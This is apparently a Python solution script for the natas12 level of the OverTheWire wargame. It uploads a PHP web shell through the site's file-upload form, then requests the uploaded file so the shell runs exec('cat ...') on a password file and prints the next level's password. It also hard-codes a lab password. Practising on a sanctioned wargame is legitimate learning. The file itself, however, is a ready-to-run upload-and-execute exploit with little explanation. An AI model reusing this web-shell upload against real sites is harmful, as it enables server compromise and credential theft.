# webscraper for natas12
import requests
from bs4 import BeautifulSoup
import re
from requests_toolbelt import MultipartEncoder

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}
fields = {
    'MAX_FILE_SIZE': ('1000'),
    'filename': 'zpxzxbzdzp.php',
    'uploadedfile': ('Content-Type: application/octet-stream', '<?php echo exec("cat /etc/natas_webpass/natas13"); ?>'),
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    viewSourceURI = soup.find('a')['href']
    print(viewSourceURI)
    return viewSourceURI

def sourceRequest():  # shows 'include "includes/secret.inc";'
    session = requests.Session()
    resp2 = session.get(url + '/' + viewSource, auth=(username, password))
    content = resp2.text
    print(content)
    soup = BeautifulSoup(content, 'html.parser')
    print(soup.code)

def uploadRequest():
    session = requests.Session()
    m = MultipartEncoder(fields, boundary='----------------------------7140251896146')
    resp3 = session.post(url, auth=(username, password), headers={'Content-Type': m.content_type}, data=m.to_string(), proxies=proxies)
    content = resp3.text
    #print(content)
    soup = BeautifulSoup(content, 'html.parser')
    path = soup.find('a')['href']
    print(path)
    return path

def fileRequest(file):
    session = requests.Session()
    resp4 = session.get(url + '/' + filePath, auth=(username, password))
    regex = re.findall("\w{32}", resp4.text)
    print(str(regex)[2:34])

viewSource = initialRequest()
sourceRequest()
filePath = uploadRequest()
fileRequest(filePath)

